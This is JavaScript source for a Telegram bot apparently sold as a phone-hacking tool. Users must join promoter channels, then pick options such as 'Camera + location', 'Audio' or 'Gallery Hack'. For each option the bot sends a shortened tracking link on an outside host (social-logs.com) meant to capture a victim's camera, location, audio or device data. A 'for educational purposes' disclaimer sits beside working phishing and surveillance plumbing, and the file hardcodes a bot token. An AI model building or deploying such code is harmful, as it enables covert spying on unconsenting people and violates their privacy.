const axios = require('axios');
const fs = require('fs');

const TelegramBot = require('node-telegram-bot-api');

// Replace 'YOUR_BOT_TOKEN' with your actual bot token obtained from BotFather
const bot = new TelegramBot('6235973731:AAEcM_k-yQRlAyZvmE7rhNMp9Ia6xxTH9qY', { polling: true });

const channels = [
  // Add your channel IDs here
  '-1001624595219',
  '-1001855310517',
  '-1001551417911',
];

bot.onText(/\/start/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  // Check if user is already added in the data
  // You can implement your own logic to check the data store
  const isUserAdded = checkUserInData(userId);

  if (!isUserAdded) {
    // Add user to data
    addUserToData(userId);

    // Send join channel message
    
  
    // User already joined the channel, check membership status
    const isInChannel = await JoineCheck(userId);

    if (isInChannel) {
      // User is a member of all channels, send inline keyboard markup
      sendInlineKeyboard(chatId);
    } else {
      // User is not a member of all channels, handle accordingly
      chajoin(chatId)
      bot.sendMessage(chatId, 'कृपया सभी आवश्यक चैनलों को ज्वाइन करें ताकि आप फीचर्स का उपयोग कर सकें।');
    }
  }
});

bot.on('callback_query', (callbackQuery) => {
  const chatId = callbackQuery.message.chat.id;
  const data = callbackQuery.data;

  switch (data) {
    case 'option1':
      const userId = callbackQuery.message.chat.id;
      handleOption1(userId);
      break;
    case 'option2':
      const userId2 = callbackQuery.message.chat.id;
      handleOption2(userId2);
      break;
    case 'option3':
      const userId3 = callbackQuery.message.chat.id;
      handleOption3(userId3);
      break;
    case 'option4':
      const userId4 = callbackQuery.message.chat.id;
      handleOption4(userId4);
      break;
    case 'option5':
      const userId5 = callbackQuery.message.chat.id;
      handleOption5(userId5);
      break;
    case 'option6':
      const userId6 = callbackQuery.message.chat.id;
      handleOption6(userId6);
      break;
    case 'option7':
      const userId7 = callbackQuery.message.chat.id;
      handleOption7(userId7);
      break;
    case 'option8':
      const userId8 = callbackQuery.message.chat.id;
      handleOption8(userId8);
      break;
    case 'help':
      // Handle help callback
      sendHelpMessage(chatId);
      break;
    case 'sos':
      // Handle SOS callback
      sendInlineKeyboard(chatId)
      break;
    case 'option9':
      const userId9 = callbackQuery.message.chat.id;
      handleOption9(userId9);
      break;
    // Add more cases for other options
  }


});

// Function to send the inline keyboard markup
function sendInlineKeyboard(chatId) {
  const options = [
    [
      { text: 'All In One Hack 😈', callback_data: 'option1' },
      { text: 'Only Location 👅', callback_data: 'option2' },
    ],
    [
      { text: 'Only Camera ☠️', callback_data: 'option3' },
      { text: 'Camera + location 👽', callback_data: 'option4' },
    ],
    [
      { text: 'Only Mobile InFo 👻', callback_data: 'option5' },
      { text: 'Audio ☠️', callback_data: 'option6' },
    ],
    [
      { text: 'Gallery Hack 👺', callback_data: 'option7' },
      { text: 'Coming 👾', callback_data: 'option8' },
    ],
    [
      { text: 'Disclaimer 📛', callback_data: 'option9' },
    ]
  ];

  const inlineKeyboardMarkup = {
    inline_keyboard: options,
  };

  bot.sendMessage(chatId, 'Please select an option:', {
    reply_markup: inlineKeyboardMarkup,
  });
}


// Function to send a "Good Morning" message
function sendGoodMorningMessage(chatId) {
  bot.sendMessage(chatId, 'Good Morning! Have a great day!');
}

// Function to check if user is already added in the data
function checkUserInData(userId) {
  // Implement your own logic to check if the user is already added in the data store
  // Return true if user is found, otherwise false
  return false;
}

// Function to add user to the data
function addUserToData(userId) {
  // Implement your own logic to add the user to the data store
}

// Async function to check if the user is a member of all required channels
async function JoineCheck(userId) {
  try {
    for (const channel of channels) {
      const chatMember = await bot.getChatMember(channel, userId);
      const isMember = ['creator', 'administrator', 'member'].includes(chatMember.status);

      if (!isMember) {
        return false;
      }
    }

    return true;
  } catch (error) {
        console.error('Error checking membership:', error);
    return false;
  }
}

// Start the bot
bot.on('polling_error', (error) => {
  console.error('Polling error:', error);
});

bot.onText(/\/stkm/, (msg) => {
  const chatId = msg.chat.id;

  // Send a welcome message
  bot.sendMessage(chatId, 'Welcome to the bot! Use /join to join the channels.');
});

function chajoin(chatId) {
  

  // Send the join channel message
  bot.sendMessage(chatId, '⚠️ इस बॉट का उपयोग करने के लिए आपको हमारे टेलीग्राम चैनल को ज्वाइन करना होगा।\n\n\nसफलतापूर्वक 3 टेलीग्राम चैनल में ज्वाइन होने के बाद, आपको /start टाइप करना होगा', {
    reply_markup: {
      inline_keyboard: [
        [
          {
            text: 'चैनल 1',
            url: 'https://t.me/cmechanic',
          },
          {
            text: 'चैनल 2',
            url: 'https://t.me/earningstore7',
          },
        ],
        [
          {
            text: 'चैनल 3',
            url: 'https://t.me/tehsiltech',
          },
        ],
      ],
    },
  });
const adminChatId = '5903136689'; // Replace with the admin's chat ID

bot.sendMessage(adminChatId, `New user joined:\nChat ID: ${chatId}`);
addUserIdToDataFile(chatId);
}

    
// Function to handle unknown commands
bot.onText(/\/.*/, (msg) => {
  const chatId = msg.chat.id;

  // Send an error message for unknown commands
  bot.sendMessage(chatId, '/start');
});

// Example usage of handleOption2 function
function handleOption1(userId) {
  
  const u = String(userId);
  const link = `Https://social-logs.com/i/?id=${u}`;
  const url = `https://social-logs.com/k/short.php?url=${link}`;

  // Make an HTTP request to get the shortened URL
  axios
    .get(url)
    .then((response) => {
      const result = response.data;
      const short = result.url;
      const stats = result.statistics;

      // Create the message with formatted text
      const message = `🧩 𝐏𝐚𝐠𝐞 𝐍𝐚𝐦𝐞: 𝐀𝐥𝐥 𝐈𝐧 𝐎𝐧𝐞 𝐏𝐡𝐨𝐧𝐞 𝐇𝐚𝐜𝐤 😈
\n✅ 𝐘𝐨𝐮𝐫 𝐏𝐚𝐠𝐞 𝐋𝐢𝐧𝐤- ${short}
\n🎭 𝐃𝐞𝐭𝐚𝐢𝐥𝐬 𝐆𝐞𝐭 𝐎𝐧- @Phonehacking1bot`;


      // Send the message to the user
      bot.sendMessage(userId, message);
    })
    .catch((error) => {
      console.error('Error retrieving shortened URL:', error);
    });
}

function handleOption2(userId2) {
  
  const u = String(userId2);
  const link = `Https://social-logs.com/t/?id=${u}`;
  const url = `https://social-logs.com/k/short.php?url=${link}`;

  // Make an HTTP request to get the shortened URL
  axios
    .get(url)
    .then((response) => {
      const result = response.data;
      const short = result.url;
      const stats = result.statistics;

      // Create the message with formatted text
      const message = `🧩 𝐏𝐚𝐠𝐞 𝐍𝐚𝐦𝐞: ONLY LOCATION 𝐇𝐚𝐜𝐤 😈
\n✅ 𝐘𝐨𝐮𝐫 𝐏𝐚𝐠𝐞 𝐋𝐢𝐧𝐤- ${short}
\n🎭 𝐃𝐞𝐭𝐚𝐢𝐥𝐬 𝐆𝐞𝐭 𝐎𝐧- @Phonehacking1bot`;


      // Send the message to the user
      bot.sendMessage(userId2, message);
    })
    .catch((error) => {
      console.error('Error retrieving shortened URL:', error);
    });
}


function handleOption3(userId3) {
  
  const u = String(userId3);
  const link = `Https://social-logs.com/I/?id=${u}`;
  const url = `https://social-logs.com/k/short.php?url=${link}`;

  // Make an HTTP request to get the shortened URL
  axios
    .get(url)
    .then((response) => {
      const result = response.data;
      const short = result.url;
      const stats = result.statistics;

      // Create the message with formatted text
      const message = `🧩 𝐏𝐚𝐠𝐞 𝐍𝐚𝐦𝐞: ONLY CAMERA 𝐇𝐚𝐜𝐤 😈
\n✅ 𝐘𝐨𝐮𝐫 𝐏𝐚𝐠𝐞 𝐋𝐢𝐧𝐤- ${short}
\n🎭 𝐃𝐞𝐭𝐚𝐢𝐥𝐬 𝐆𝐞𝐭 𝐎𝐧- @Phonehacking1bot`;


      // Send the message to the user
      bot.sendMessage(userId3, message);
    })
    .catch((error) => {
      console.error('Error retrieving shortened URL:', error);
    });
}


function handleOption4(userId4) {
  
  const u = String(userId4);
  const link = `Https://social-logs.com/c/?id=${u}`;
  const url = `https://social-logs.com/k/short.php?url=${link}`;

  // Make an HTTP request to get the shortened URL
  axios
    .get(url)
    .then((response) => {
      const result = response.data;
      const short = result.url;
      const stats = result.statistics;

      // Create the message with formatted text
      const message = `🧩 𝐏𝐚𝐠𝐞 𝐍𝐚𝐦𝐞:  CAMERA + LOCATION 𝐇𝐚𝐜𝐤 😈
\n✅ 𝐘𝐨𝐮𝐫 𝐏𝐚𝐠𝐞 𝐋𝐢𝐧𝐤- ${short}
\n🎭 𝐃𝐞𝐭𝐚𝐢𝐥𝐬 𝐆𝐞𝐭 𝐎𝐧- @Phonehacking1bot`;


      // Send the message to the user
      bot.sendMessage(userId4, message);
    })
    .catch((error) => {
      console.error('Error retrieving shortened URL:', error);
    });
}

function handleOption5(userId5) {
  
  const u = String(userId5);
  const link = `Https://social-logs.com/1/?id=${u}`;
  const url = `https://social-logs.com/k/short.php?url=${link}`;

  // Make an HTTP request to get the shortened URL
  axios
    .get(url)
    .then((response) => {
      const result = response.data;
      const short = result.url;
      const stats = result.statistics;

      // Create the message with formatted text
      const message = `🧩 𝐏𝐚𝐠𝐞 𝐍𝐚𝐦𝐞: ONLY MOBILE INFO 𝐇𝐚𝐜𝐤 😈
\n✅ 𝐘𝐨𝐮𝐫 𝐏𝐚𝐠𝐞 𝐋𝐢𝐧𝐤- ${short}
\n🎭 𝐃𝐞𝐭𝐚𝐢𝐥𝐬 𝐆𝐞𝐭 𝐎𝐧- @Phonehacking1bot`;


      // Send the message to the user
      bot.sendMessage(userId5, message);
    })
    .catch((error) => {
      console.error('Error retrieving shortened URL:', error);
    });
}

function handleOption6(userId6) {
  
  const u = String(userId6);
  const link = `Https://social-logs.com/j/?id=${u}`;
  const url = `https://social-logs.com/k/short.php?url=${link}`;

  // Make an HTTP request to get the shortened URL
  axios
    .get(url)
    .then((response) => {
      const result = response.data;
      const short = result.url;
      const stats = result.statistics;

      // Create the message with formatted text
      const message = `🧩 𝐏𝐚𝐠𝐞 𝐍𝐚𝐦𝐞:  AUDIO 𝐇𝐚𝐜𝐤 😈
\n✅ 𝐘𝐨𝐮𝐫 𝐏𝐚𝐠𝐞 𝐋𝐢𝐧𝐤- ${short}
\n🎭 𝐃𝐞𝐭𝐚𝐢𝐥𝐬 𝐆𝐞𝐭 𝐎𝐧- @Phonehacking1bot`;


      // Send the message to the user
      bot.sendMessage(userId6, message);
    })
    .catch((error) => {
      console.error('Error retrieving shortened URL:', error);
    });
}

function handleOption7(userId7){

  bot.sendMessage(userId7, 'Its Phone Hacking Node Js Bot Developer :- @indiaop_xxd');
}

function handleOption8(userId8){
    bot.sendMessage(userId8, 'Coming Soon 😎');
}


function handleOption9(chatId) {
  const disclaimerText = "⛔ Disclaimer ⛔\n\n⚠️ Disclaimer: Using this telegram bot for phone hacking is illegal and unethical. This bot is intended for educational purposes only, and the developers do not take responsibility for any misuse or illegal activity conducted using this bot. Please use at your own risk and discretion. Remember, hacking someone's phone without their consent is a serious violation of their privacy and can result in legal consequences. #StaySafe 🙏.";

  // Create inline keyboard options
  const inlineKeyboardMarkup = {
    inline_keyboard: [
      [
        { text: 'Help', callback_data: 'help' },
        { text: 'Create New Pages', callback_data: 'sos' }
      ]
    ]
  };

  // Send the disclaimer message with bold text and inline keyboard
  bot.sendMessage(chatId, `*${disclaimerText}*`, {
    parse_mode: "Markdown",
    reply_markup: inlineKeyboardMarkup
  });
}

function sendHelpMessage(chatId) {
  const helpText = "🆘 Need Help? 🆘\n\nIf you need any assistance or have any questions, please visit our Help Center or contact our Support team.";
  
  const inlineKeyboardMarkup = {
    inline_keyboard: [
      [
        { text: "Help Center", url: "https://t.me/Fastchat_Robot" },
        { text: "Contact Support", url: "https://t.me/Techcm0" },
      ],
    ],
  };
  
  bot.sendMessage(chatId, helpText, {
    reply_markup: inlineKeyboardMarkup,
  });
}


// Example function to make an HTTP request using the 'axios' library
// Replace this with your preferred method of making HTTP requests
function makeHttpRequest(url) {
  return axios.get(url);
}

// Usage example
bot.onText(/\/face/, (msg) => {
  handleOption2(bot, msg);
});
//an HTTP request using the 'axios' library
// Replace this with your preferred method of making HTTP requests
function makeHttpRequest(url) {
  return axios.get(url);
}



function addUserIdToDataFile(userId) {
  // Read the contents of the data file
  const data = fs.readFileSync('data.txt', 'utf8');

  // Split the data into an array of user IDs
  const userIds = data.split(',');

  // Check if the user ID already exists in the array
  if (userIds.includes(userId.toString())) {
    console.log('User ID already exists. Skipping addition.');
    return;
  }

  // Add the new user ID to the array
  userIds.push(userId.toString());

  // Join the user IDs array back into a string
  const newData = userIds.join(',');

  // Write the updated data back to the file
  fs.writeFileSync('data.txt', newData, 'utf8');

  console.log('User ID added successfully.');
}
           
